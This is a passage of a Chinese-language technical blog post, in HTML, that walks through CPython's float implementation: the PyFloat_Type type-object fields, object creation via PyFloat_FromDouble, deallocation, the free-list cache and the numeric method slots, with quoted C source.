*/</span></span><br><span class="line">    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_BASETYPE,   <span class="comment">/* tp_flags */</span></span><br><span class="line">    float_new__doc__,                           <span class="comment">/* tp_doc */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_traverse */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_clear */</span></span><br><span class="line">    float_richcompare,                          <span class="comment">/* tp_richcompare */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_weaklistoffset */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_iter */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_iternext */</span></span><br><span class="line">    float_methods,                              <span class="comment">/* tp_methods */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_members */</span></span><br><span class="line">    float_getset,                               <span class="comment">/* tp_getset */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_base */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_dict */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_descr_get */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_descr_set */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_dictoffset */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_init */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_alloc */</span></span><br><span class="line">    float_new,                                  <span class="comment">/* tp_new */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><br><h5 id="字段解读"><a href="#字段解读" class="headerlink" title="字段解读"></a>字段解读</h5><p>在python中，一切皆对象。类型对象也是对象，逃不开定长头部<code>PyObject</code> 或变长头部 <code>PyVarObject</code></p><p>在<code>PyFloat_Type</code>中，看到其使用的了宏<code>PyVarObject_HEAD_INIT(&amp;PyType_Type, 0)</code>初始化对象头部，向光宏定义在&#x2F;include&#x2F;object.h中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PyObject_HEAD_INIT(type)        \</span></span><br><span class="line"><span class="meta">    &#123; _PyObject_EXTRA_INIT              \</span></span><br><span class="line"><span class="meta">    1, type &#125;,</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PyVarObject_HEAD_INIT(type, size)       \</span></span><br><span class="line"><span class="meta">    &#123; PyObject_HEAD_INIT(type) size &#125;,</span></span><br></pre></td></tr></table></figure><p>可以看到，变长对象头部比定长对象头部多了一个字段ob_size：</p><blockquote><p>对于静态分配类型对象，应将其初始化为零。对于动态分配的类型对象，此字段具有特殊的内部含义。</p></blockquote><p>有了初始化宏定义，我们知道了对于<code>PyFloat_Type</code>的头部信息：</p><img src="/2022/05/14/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-%E6%B5%AE%E7%82%B9%E5%AF%B9%E8%B1%A1/2.png" class=""><p><code>PyFloat_Type</code>中还保存着许多关于<strong>浮点对象的元信息</strong>：（由于比较多，介绍关键字段）</p><ul><li><p><strong>tp_name</strong>，指向包含类型名称的NUL终止字符串。对于动态分配的类型对象，这应该只是类型名称，并且模块名称显式地存储在类型dict中作为关键字 <code>__module__</code>的值。</p></li><li><p><strong>tp_basicsize</strong> &amp; <strong>tp_itemsize</strong>，分配对象内存需要的字段。</p><blockquote><p>有两种类型：具有固定长度实例的类型 <a href="https://www.rddoc.com/doc/Python/3.6.0/zh/c-api/typeobj/#c.PyTypeObject.tp_itemsize"><code>tp_itemsize</code></a> 字段为0，具有可变长度实例的类型具有非零 <a href="https://www.rddoc.com/doc/Python/3.6.0/zh/c-api/typeobj/#c.PyTypeObject.tp_itemsize"><code>tp_itemsize</code></a>字段。</p><p>对于具有固定长度实例的类型，所有实例具有相同的大小，在 <a href="https://www.rddoc.com/doc/Python/3.6.0/zh/c-api/typeobj/#c.PyTypeObject.tp_basicsize"><code>tp_basicsize</code></a> 中给出。</p><p>对于具有可变长度实例的类型，实例必须具有 <code>ob_size</code> 字段，实例大小为 <a href="https://www.rddoc.com/doc/Python/3.6.0/zh/c-api/typeobj/#c.PyTypeObject.tp_basicsize"><code>tp_basicsize</code></a> 加N乘以 <a href="https://www.rddoc.com/doc/Python/3.6.0/zh/c-api/typeobj/#c.PyTypeObject.tp_itemsize"><code>tp_itemsize</code></a>，其中N是对象的“长度”。 N的值通常存储在实例的 <code>ob_size</code> 字段中。</p></blockquote></li><li><p><strong>tp_dealloc</strong>，指向实例析构函数的指针。必须定义此函数，除非类型保证其实例永远不会被释放。</p><blockquote><p>当新的引用计数为零时，析构函数由 <a href="https://www.rddoc.com/doc/Python/3.6.0/zh/c-api/refcounting/#c.Py_DECREF"><code>Py_DECREF()</code></a> 和 <a href="https://www.rddoc.com/doc/Python/3.6.0/zh/c-api/refcounting/#c.Py_XDECREF"><code>Py_XDECREF()</code></a> 宏调用。此时，实例仍然存在，可能在对应的缓冲池，下次直接分配直接调出来。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">float</span>(<span class="string">&#x27;3.14&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(f))</span><br><span class="line"><span class="keyword">del</span>(f)</span><br><span class="line">g = <span class="built_in">float</span>(<span class="string">&#x27;3.14&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(g))</span><br><span class="line"><span class="comment">#----------output---------#</span></span><br><span class="line"><span class="number">140253030159792</span></span><br><span class="line"><span class="number">140253030159792</span>//释放实例对象分，并不是将其资源完全释放掉，而是放进缓冲区</span><br></pre></td></tr></table></figure></li><li><p><strong>tp_as_number</strong>，对应对象的数值型操作集</p></li><li><p><strong>tp_as_sequence</strong>，对应对象的序列型操作集</p></li><li><p><strong>tp_as_mapping</strong>，对应对象的关联型操作集</p></li><li><p><strong>tp_hash</strong>，计算对象的hash值方法</p></li><li><p><strong>tp_call</strong>，当对象为可调用对象时，不为null，否则为null</p></li><li><p><strong>tp_flags</strong>，一些标识位</p><ul><li><code>Py_TPFLAGS_HEAPTYPE</code>，当对象是在堆中分配，置该位。</li><li><code>Py_TPFLAGS_BASETYPE</code>，该类型可作为另一类型的基本类型，置该位。</li><li><code>Py_TPFLAGS_READY</code>，当 PyType_Ready() 完全初始化类型对象时，该位置位。</li><li><code>Py_TPFLAGS_READYING</code>，当 PyType_Ready() 处于初始化类型对象的过程中时，该位被置位。</li><li><code>Py_TPFLAGS_HAVE_GC</code>，当对象支持垃圾回收时，该位置位。如果设置此位，则必须使用 <a href="https://www.rddoc.com/doc/Python/3.6.0/zh/c-api/gcsupport/#c.PyObject_GC_New"><code>PyObject_GC_New()</code></a> 创建实例，并使用 <a href="https://www.rddoc.com/doc/Python/3.6.0/zh/c-api/gcsupport/#c.PyObject_GC_Del"><code>PyObject_GC_Del()</code></a> 销毁。</li><li>…</li></ul></li><li><p><strong>tp_methods</strong>，指向静态 <em>NULL</em> 终止的 <a href="https://www.rddoc.com/doc/Python/3.6.0/zh/c-api/structures/#c.PyMethodDef"><code>PyMethodDef</code></a> 结构数组的可选指针，声明此类型的常规方法。</p></li><li><p><strong>tp_base</strong>，指向继承类型属性的基本类型的可选指针。</p></li><li><p><strong>tp_dict</strong>，在调用PyType_Ready之前，该字段通常应该初始化为 <em>NULL</em>；它也可以被初始化为包含该类型的初始属性的字典。</p></li><li><p><strong>tp_init</strong>，指向实例初始化函数的可选指针。</p></li><li><p><strong>tp_alloc</strong>，指向实例分配函数的可选指针。</p></li><li><p><strong>tp_new</strong>，指向实例创建函数的可选指针。</p></li><li><p><strong>tp_free</strong>，指向实例释放函数的可选指针。它的签名是 <code>freefunc</code></p></li></ul><p>介绍完后，我们看回<code>PyFloat_Type</code></p><table><thead><tr><th>字段名</th><th>字段说明</th></tr></thead><tbody><tr><td>tp_name</td><td>类型名称为float</td></tr><tr><td>tp_basicsize &#x3D; sizeof(PyFloatObject)，tp_itemsize &#x3D; 0</td><td>鉴于float为定长对象，因此itemsize&#x3D;0且对象大小为sizeof(PyFloatObject)</td></tr><tr><td>tp_dealloc &#x3D; float_dealloc</td><td>对象析构函数为float_dealloc</td></tr><tr><td>tp_as_number &#x3D; &amp;float_as_number</td><td>float对象支持数值操作集</td></tr><tr><td>tp_hash &#x3D; (hashfunc)float_hash</td><td>float对象提供计算对象hash值的函数</td></tr><tr><td>tp_methods &#x3D; float_methods</td><td>其中存放float类型的常规方法</td></tr><tr><td>tp_new &#x3D; float_new</td><td>实例创建函数的可选指针</td></tr></tbody></table><br><hr><h4 id="对象的创建"><a href="#对象的创建" class="headerlink" title="对象的创建"></a>对象的创建</h4><h5 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h5><p>float实例对象的创建需要调用相应的<strong>可调用对象float</strong>，由于<strong>类型对象float</strong>是可调用对象，因此<strong>类型对象float</strong>的tp_call字段不为空。当<strong>实例对象</strong>创建，会调用<strong>类型对象的类型（PyType_Type中的tp_call）</strong>，之所以是<code>PyType_Type</code>是由于PyFloat_Type的ObjectHead宏初始化设置的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PyVarObject_HEAD_INIT(&amp;PyType_Type, <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>而<code>PyType_Type.tp_call</code>又会调用<code>PyFloat_Type.tp_new</code>进行内存分配，大小根据<code>PyFloat_Type.ob_seize</code>进行分配，随后调用<code>PyFloat_Type.tp_init</code>完成对象初始化。</p><img src="/2022/05/14/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-%E6%B5%AE%E7%82%B9%E5%AF%B9%E8%B1%A1/3.png" class=""><p>回去看<code>PyFloat_Type.tp_init</code>发现其内容为0，即指向<code>PyFloat_Type</code>对象初始化的函数指针为空，这是由于float是一种简单对象，初始化操作只需要一个赋值语句，完成对<code>PyFloatObject.ob_fval</code>的赋值，这是一个很简单的初始化操作，python直接在<code>PyFloat_Type.tp_new</code>中完成了。</p><br><h5 id="特型"><a href="#特型" class="headerlink" title="特型"></a>特型</h5><p>除了通用的流程，python为内置对象实现了对象创建API，简化调用，提高效率：</p><p>查阅文档发现对应的两个API，一个使用C语言中的double完成对象创建，一个则是使用字符串对象创建</p><img src="/2022/05/14/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-%E6%B5%AE%E7%82%B9%E5%AF%B9%E8%B1%A1/4.png" class=""><p>跟踪<code>PyFloat_FromDouble</code>，看下特型方法创建对象的流程，代码位置&#x2F;objects&#x2F;floatobject.c：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PyObject *</span><br><span class="line"><span class="title function_">PyFloat_FromDouble</span><span class="params">(<span class="type">double</span> fval)</span></span><br><span class="line">&#123;</span><br><span class="line">    PyFloatObject *op = free_list;</span><br><span class="line">    <span class="keyword">if</span> (op != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        free_list = (PyFloatObject *) Py_TYPE(op);</span><br><span class="line">        numfree--;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        op = (PyFloatObject*) PyObject_MALLOC(<span class="keyword">sizeof</span>(PyFloatObject));</span><br><span class="line">        <span class="keyword">if</span> (!op)</span><br><span class="line">            <span class="keyword">return</span> PyErr_NoMemory();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Inline PyObject_New */</span></span><br><span class="line">    (<span class="type">void</span>)PyObject_INIT(op, &amp;PyFloat_Type);</span><br><span class="line">    op-&gt;ob_fval = fval;</span><br><span class="line">    <span class="keyword">return</span> (PyObject *) op;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先需要搞清楚<code>free_list</code>是定义在同文件中<code>static PyFloatObject *free_list = NULL;</code> 从字面意义上理解，free_list构建了一个空闲对象缓冲池。</p><p>使用特型方法<code>PyFloat_FromDouble</code>创建对象会优先使用空闲对象缓冲池。</p><ul><li>当空闲对象缓冲池不为空，则取出一个空闲对象进行分配，然后记录当前空闲对象池中对象个数的<code>numfree</code>-1</li><li>当空闲对象缓冲池尾空，则调用<code>PyObject_MALLOC</code>分配大小为一个<code>PyFloatObject</code>大小的内存空间</li><li>对象所需内存空间分配成功后调用<code>PyObject_INIT</code>进行初始化工作</li><li>最后设置浮点对象的数值，将整个对象返回</li></ul><p>跟踪<code>PyObject_INIT</code> ，看看初始化都完成了哪些工作，定位到&#x2F;Objects&#x2F;object.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PyObject *</span><br><span class="line"><span class="title function_">PyObject_Init</span><span class="params">(PyObject *op, PyTypeObject *tp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (op == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> PyErr_NoMemory();</span><br><span class="line">    <span class="comment">/* Any changes should be reflected in PyObject_INIT (objimpl.h) */</span></span><br><span class="line">    Py_TYPE(op) = tp;</span><br><span class="line">    _Py_NewReference(op);</span><br><span class="line">    <span class="keyword">return</span> op;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>第7行位置是调用了宏  <code>#define Py_TYPE(ob)             (((PyObject*)(ob))-&gt;ob_type)</code>完成的是<code>PyObject</code>的<code>ob_type</code>设置，依据是传进来的<code>tp</code>对应的类型</p></li><li><p>然后是第8行位置，&#x2F;include&#x2F;object.h中找到相关的宏定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _Py_NewReference(op) (                          \</span></span><br><span class="line"><span class="meta">    _Py_INC_TPALLOCS(op) _Py_COUNT_ALLOCS_COMMA         \</span></span><br><span class="line"><span class="meta">    _Py_INC_REFTOTAL  _Py_REF_DEBUG_COMMA               \</span></span><br><span class="line"><span class="meta">    Py_REFCNT(op) = 1)</span></span><br></pre></td></tr></table></figure><p>发现是对象引用计数的一些设置</p></li></ul><p>简言之，特型API创建对象先是从空闲对象池中优先分配，若空闲对象池为空，则使用<code>PyObject_MALLOC</code>分配对应的对象需要的空间，随后调用<code>PyObject_INIT</code>完成初始化工作，设置浮点对象的<code>ob_fval</code>.</p><hr><br><h4 id="对象的销毁"><a href="#对象的销毁" class="headerlink" title="对象的销毁"></a>对象的销毁</h4><p>我们在<code>PyFloat_Type</code>中注意到有这样一个字段<code>tp_dealloc </code>，关于这个字段的描述：</p><blockquote><p>指向实例析构函数的指针。必须定义此函数，除非类型保证其实例永远不会被释放（如单例 <code>None</code> 和 <code>Ellipsis</code> 的情况）。</p><p>当新的引用计数为零时，析构函数由 <code>Py_DECREF()</code> 和 <code>Py_XDECREF()</code> 宏调用。此时，实例仍然存在，但没有对它的引用。</p></blockquote><p>不难判断，该字段与对象销毁行为挂钩。这里以<code>PyFloat_Type</code>对象销毁为例，我们看到<code>PyFloat_Type.tp_dealloc</code>字段对应的内容为<code>(destructor)float_dealloc</code>是函数指针，顺藤摸瓜，来到同文件下的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">float_dealloc</span><span class="params">(PyFloatObject *op)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (PyFloat_CheckExact(op)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (numfree &gt;= PyFloat_MAXFREELIST)  &#123;</span><br><span class="line">            PyObject_FREE(op);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        numfree++;</span><br><span class="line">        Py_TYPE(op) = (<span class="keyword">struct</span> _typeobject *)free_list;</span><br><span class="line">        free_list = op;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        Py_TYPE(op)-&gt;tp_free((PyObject *)op);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>第4行位置的 <code>PyFloat_CheckExact</code> 跟踪发现是个宏调用，定义于&#x2F;include&#x2F;floatobject.h，定义如下：</p><p><code>#define PyFloat_CheckExact(op) (Py_TYPE(op) == &amp;PyFloat_Type)</code>做的工作是当前确认要释放的对象是floatobject</p></li><li><p>5-11行的内容是查看当前floatobject的空闲对象池是否满了，满了则直接释放对象，否则便将记录floatobject的空闲对象数<code>numfree</code>加一，将要释放的floatobject放入空闲对象池<code>free_list</code></p></li></ul><p>简言之：就是当 <code>Py_DECREF()</code> 和 <code>Py_XDECREF()</code> 宏调用导致对象引用计数为0 ，则有这两个宏调用析构函数完成对对象的回收，具体回收流程则遵循类似上述代码的分析流程。</p><img src="/2022/05/14/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-%E6%B5%AE%E7%82%B9%E5%AF%B9%E8%B1%A1/5.png" class=""><br><h4 id="空闲对象链表"><a href="#空闲对象链表" class="headerlink" title="空闲对象链表"></a>空闲对象链表</h4><p>上边提到了这个机制，这里依旧以浮点数对象为例，做一点内容补充</p><p>浮点对象运算背后设计大量临时对象的创建与销毁。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pi = <span class="number">3.14</span></span><br><span class="line">r = <span class="number">2</span></span><br><span class="line">area = pi * r ** <span class="number">2</span></span><br><span class="line">area</span><br></pre></td></tr></table></figure><p>第三行代码的浮点运算在python内部：</p><ul><li>先计算半径r的平方，结果存放在python中的一个临时对象中，这里假设临时变量为 t</li><li>然后完成 t 与 pi的成绩运算，最终得到的运算结果存放在 area 中</li><li>随后对临时变量进行销毁</li></ul><p>如此一来，不难想象会因为<strong>临时变量的创建与销毁而增加执行时的开销。</strong></p><p>创建对象时需要分配内存，销毁对象需要回收内存。当程序内部存在大量的临时变量的创建&amp;销毁，无疑会给程序带来极大的负担，因此python<strong>引入空闲对象缓冲池</strong>机制。在该机制下，python在对象销毁后，并不急于收回分配出去的资源，而是将当前销毁的对象放入一个空闲链表，后续当创建相同类型对象时直接从中取出，省去新对象的创建与销毁的开销。以浮点对象PyFloatObject为例，它的空闲链表定义位置在&#x2F;objects&#x2F;floatobject.c中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PyFloat_MAXFREELIST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PyFloat_MAXFREELIST    100</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> numfree = <span class="number">0</span>;</span><br><span class="line"><span class="type">static</span> PyFloatObject *free_list = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><ul><li><code>PyFloat_MAXFREELIST</code>空闲缓冲链表最大的容量</li><li><code>numfree</code>指示当前空闲缓冲链表内的空闲对象个数</li><li><code>free_list</code>指向空闲缓冲链表</li></ul><p>由于是保存的事空闲对象，并且以链表形式，存在遍历需要。Python在实现该机制中使用了对象中的<code>ob_type</code>字段作为链表节点的<code>next</code>指针使用</p><img src="/2022/05/14/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-%E6%B5%AE%E7%82%B9%E5%AF%B9%E8%B1%A1/6.png" class=""><p>当创建了同样是PyFloat_Type的对象时，以<code>PyFloat_FromDouble</code>为例，有下面这样的行为(这里只截取关键部分)：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PyFloatObject *op = free_list;</span><br><span class="line"><span class="keyword">if</span> (op != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    free_list = (PyFloatObject *) Py_TYPE(op);</span><br><span class="line">    numfree--;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>销毁时也是类似的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (numfree &gt;= PyFloat_MAXFREELIST)  &#123;</span><br><span class="line">    PyObject_FREE(op);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">numfree++;</span><br><span class="line">Py_TYPE(op) = (<span class="keyword">struct</span> _typeobject *)free_list;</span><br><span class="line">free_list = op;</span><br></pre></td></tr></table></figure><p>优先将待销毁对象放入空闲对象链表中，若空闲链表已满，则使用<code>PyObject_FREE</code>进行对象释放</p><hr><br><h4 id="对象的行为"><a href="#对象的行为" class="headerlink" title="对象的行为"></a>对象的行为</h4><p>同样以<code>PyFLoat_Type</code>为例，<code>PyFLoat_Type</code>中定义了许多字段，其中某些字段是函数指针，例如：tp_hash、tp_repr等，这些函数指针决定了<code>PyFLoat_Type</code>的允许进行的行为。</p><p>之前我们提过，类型不同的对象，其行为是存在行为的，这点相信很好理解，例如对于list对象，可以进行append，而float则不行，在者我们还知道了python根据行为的一些特点，进行了操作型的分类：数值型操作<code>tp_as_number</code>、序列型操作<code>tp_as_sequence</code>、关联型操作<code>tp_as_mapping</code></p><p>比如对于浮点类型<code>PyFloat_Type</code>，允许的操作：<code>&amp;float_as_number,    /* tp_as_number */</code>，根据具体类型进行<code>tp_as_number</code>特化处理</p><br><p>这里可以讨论稍微泛用一些，由于这些操作是所有对象通用，只是存在启用与否、行为差异也无妨，因此初步锁定相关代码在&#x2F;Objects&#x2F;object.h中定义</p><h5 id="数值型操作"><a href="#数值型操作" class="headerlink" title="数值型操作"></a>数值型操作</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="comment">/* Number implementations must check *both*</span></span><br><span class="line"><span class="comment">       arguments for proper type and implement the necessary conversions</span></span><br><span class="line"><span class="comment">       in the slot functions themselves. */</span></span><br><span class="line"></span><br><span class="line">    binaryfunc nb_add;</span><br><span class="line">    binaryfunc nb_subtract;</span><br><span class="line">    binaryfunc nb_multiply;</span><br><span class="line">    binaryfunc nb_remainder;</span><br><span class="line">    binaryfunc nb_divmod;</span><br><span class="line">    ternaryfunc nb_power;</span><br><span class="line">    unaryfunc nb_negative;</span><br><span class="line">    unaryfunc nb_positive;</span><br><span class="line">    unaryfunc nb_absolute;</span><br><span class="line">    inquiry nb_bool;</span><br><span class="line">    unaryfunc nb_invert;</span><br><span class="line">    binaryfunc nb_lshift;</span><br><span class="line">    binaryfunc nb_rshift;</span><br><span class="line">    binaryfunc nb_and;</span><br><span class="line">    binaryfunc nb_xor;</span><br><span class="line">    binaryfunc nb_or;</span><br><span class="line">    unaryfunc nb_int;</span><br><span class="line">    <span class="type">void</span> *nb_reserved;  <span class="comment">/* the slot formerly known as nb_long */</span></span><br><span class="line">    unaryfunc nb_float;</span><br><span class="line"></span><br><span class="line">    binaryfunc nb_inplace_add;</span><br><span class="line">    binaryfunc nb_inplace_subtract;</span><br><span class="line">    binaryfunc nb_inplace_multiply;</span><br><span class="line">    binaryfunc nb_inplace_remainder;</span><br><span class="line">    ternaryfunc nb_inplace_power;</span><br><span class="line">    binaryfunc nb_inplace_lshift;</span><br><span class="line">    binaryfunc nb_inplace_rshift;</span><br><span class="line">    binaryfunc nb_inplace_and;</span><br><span class="line">    binaryfunc nb_inplace_xor;</span><br><span class="line">    binaryfunc nb_inplace_or;</span><br><span class="line"></span><br><span class="line">    binaryfunc nb_floor_divide;</span><br><span class="line">    binaryfunc nb_true_divide;</span><br><span class="line">    binaryfunc nb_inplace_floor_divide;</span><br><span class="line">    binaryfunc nb_inplace_true_divide;</span><br><span class="line"></span><br><span class="line">    unaryfunc nb_index;</span><br><span class="line"></span><br><span class="line">    binaryfunc nb_matrix_multiply;</span><br><span class="line">    binaryfunc nb_inplace_matrix_multiply;</span><br><span class="line">&#125; PyNumberMethods;</span><br></pre></td></tr></table></figure><p>其中泛化的<code>PyNumberMethods</code> 具体到<code>PyFLoat_Type</code>下的 则是根据<code>PyFLoat_Type</code>可进行的选择启用相关字段，不启用为0:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> PyNumberMethods float_as_number = &#123;</span><br><span class="line">    float_add,          <span class="comment">/* nb_add */</span></span><br><span class="line">    float_sub,          <span class="comment">/* nb_subtract */</span></span><br><span class="line">    float_mul,          <span class="comment">/* nb_multiply */</span></span><br><span class="line">    float_rem,          <span class="comment">/* nb_remainder */</span></span><br><span class="line">    float_divmod,       <span class="comment">/* nb_divmod */</span></span><br><span class="line">    float_pow,          <span class="comment">/* nb_power */</span></span><br><span class="line">    (unaryfunc)float_neg, <span class="comment">/* nb_negative */</span></span><br><span class="line">    float_float,        <span class="comment">/* nb_positive */</span></span><br><span class="line">    (unaryfunc)float_abs, <span class="comment">/* nb_absolute */</span></span><br><span class="line">    (inquiry)float_bool, <span class="comment">/* nb_bool */</span></span><br><span class="line">    <span class="number">0</span>,                  <span class="comment">/* nb_invert */</span></span><br><span class="line">    <span class="number">0</span>,                  <span class="comment">/* nb_lshift */</span></span><br><span class="line">    <span class="number">0</span>,                  <span class="comment">/* nb_rshift */</span></span><br><span class="line">    <span class="number">0</span>,                  <span class="comment">/* nb_and */</span></span><br><span class="line">    <span class="number">0</span>,                  <span class="comment">/* nb_xor */</span></span><br><span class="line">    <span class="number">0</span>,                  <span class="comment">/* nb_or */</span></span><br><span class="line">    float___trunc___impl, <span class="comment">/* nb_int */</span></span><br><span class="line">    <span class="number">0</span>,                  <span class="comment">/* nb_reserved */</span></span><br><span class="line">    float_float,        <span class="comment">/* nb_float */</span></span><br><span class="line">    <span class="number">0</span>,                  <span class="comment">/* nb_inplace_add */</span></span><br><span class="line">    <span class="number">0</span>,                  <span class="comment">/* nb_inplace_subtract */</span></span><br><span class="line">    <span class="number">0</span>,                  <span class="comment">/* nb_inplace_multiply */</span></span><br><span class="line">    <span class="number">0</span>,                  <span class="comment">/* nb_inplace_remainder */</span></span><br><span class="line">    <span class="number">0</span>,                  <span 